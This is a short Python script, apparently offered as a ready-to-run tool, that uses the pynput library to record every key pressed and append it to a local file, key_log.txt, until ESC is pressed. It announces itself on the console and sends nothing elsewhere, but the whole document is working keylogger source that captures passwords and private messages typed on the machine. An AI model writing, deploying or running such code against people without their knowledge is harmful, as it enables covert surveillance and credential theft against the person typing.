from pynput import keyboard
import datetime

log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

def on_release(key):
    # Stop listener when ESC is pressed
    if key == keyboard.Key.esc:
        print("\n[+] Logging stopped.")
        return False

print("=== Keylogger Started ===")
print("Press ESC to stop logging.")
print(f"Keys are being saved to: {log_file}")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
